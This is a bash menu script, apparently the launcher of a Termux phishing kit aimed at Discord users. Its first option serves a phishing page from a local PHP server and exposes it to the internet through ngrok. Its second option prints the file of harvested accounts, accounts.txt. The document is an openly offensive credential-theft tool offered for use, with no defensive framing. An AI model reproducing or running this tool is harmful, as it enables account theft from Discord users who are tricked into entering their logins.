#!/bin/bash|

clear

echo -e "\033[31;23;1m
hhhhhhhhhhhhhhhhhhhh
hhhhhhhhhhhhhhhhhhhh
hhhho:-::--::-:ohhhh
hhd/::::::::::::+hhh
hdy::::o/::+o:::-shh
dm+::::o+::/o::::+hh
mNs::---////:-:::shh
mNNmhsyNNNNNNhshhhhh
dmmNmmmmmmmmNmmdhhhh
hhhdhhhhhhhhdhhhhhhh
\033[31;40;1m[01]\e[37mDiscord Phisping
\033[31;40;1m[02]\e[37mCat Data"
echo -e "\033[32;40;1mtermuxd.com"
echo ""
read -p "Operation number : " islem
if [[ $islem == 1 || $islem == 01 ]]; then
        read -p "Write Port: " port
        echo -e "\e[32m"
	sleep 2
	echo ""
	echo -e "\e[33mStarting..."
	sleep 4
	cd api/
ls
 php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 2 || $islem == 02 ]]; then
        sleep 1
echo ""
echo -e "\e[33mData"
sleep 2
echo -e "\e[37m"
cd api/assets
cat accounts.txt
echo -e '\033[31;40;1m'
read -p "Press any key to return to the main page : " xp
clear
sleep 2
cd ..
cd ..
bash start.sh
else
	echo -e '\033[31;40;1m Check your operation number!'
	sleep 2
	clear
	bash start.sh
fi


